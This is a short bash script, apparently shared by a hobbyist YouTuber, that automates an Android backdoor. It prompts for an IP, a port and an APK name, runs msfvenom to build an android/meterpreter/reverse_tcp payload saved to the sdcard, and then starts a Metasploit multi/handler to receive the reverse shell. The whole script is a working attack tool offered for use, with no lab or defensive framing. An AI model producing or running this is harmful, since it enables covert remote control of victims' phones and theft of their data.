#!/bin/bash
# Subcribe My Chanel Yt Arjun Newbie Thankss...

clear
BB='\033[34;1m'
GG='\033[32;1m'
PP='\033[35;1m'
CC='\033[36;1m'
RR='\033[31;1m'
WW='\033[37;1m'




program2(){
        echo $RR "__  __ ____  _____    ____    _    ____    _    ____ "
        echo $RR"|  \/  / ___||  ___|  / ___|  / \  |  _ \  / \  |  _ \ "
        echo $RR"| |\/| \___ \| |_ ____\___ \ / _ \ | | | |/ _ \ | |_) | "
        echo $RR"| |  | |___) |  _|_____|__) / ___ \| |_| / ___ \|  __/ "
        echo $RR"|_|  |_|____/|_|      |____/_/   \_\____/_/   \_\_|    "
        echo
         echo $CC"______________________________________"
         echo $cc"|                                     |"
         echo $CC"|  ~ AUTHOR   : DEE JUNN              |"
         echo $CC"|  ~ TOUTUBE  : ARJUN NEWBIE          |"
         echo $CC"|  ~ Facebook : Dee Junn              |"
         echo $CC"|  ~ Versi    : 2.1                   |"
         echo $CC"|  ~ Thank's  : All Support           |"
         echo $CC"|_____________________________________|"
}



program3(){
         echo
         echo
         echo
         read -p "Input Your Port  : " port;
         echo
         read -p "Masukan Your Ip  : " ip;
         echo
         echo $BB"Ex : backdoor.apk"
         read -p "Nama Backdoor : " apk;
         echo
         sleep 3
         sleep 1
         clear
         echo $GG"port     => $port"
         echo $GG"ip       => $ip"
         echo $GG"Name Apk => $apk"
}

program4(){
         echo $BB"Sedang Membuat Backdoor Mohon Sabar Ganteng:v"
         sleep 2
         msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o /sdcard/$apk
         echo
         echo $GG"Backdor Telah Terbuat Dan Tersimpan Di sdcard anda:v"
         echo
         echo $GG"Ingin Lanjut y/n?"
         read pill
         if [ $pill = "y" ] || [ $pill = "Y" ];then
              clear
              read -p "Input Your Ip   : " ip1;
              read -p "Input Your Port : " port1;
              echo "Loading..."
         else
            echo $GG"Kesalahan"
            exit
         fi
}

program5(){
         echo $GG"Sedang Mempersiap Metasploit .."
         echo $CC"Sabar Yah Orang Sabar Di Sayang Janda:v"
         sleep 1
         msfconsole -q -x "use exploit/multi/handler;
         set payload android/meterpreter/reverse_tcp;
         set lhost $ip1;
         set lport $port1;
         exploit"
}
program2
program3
program4
program5




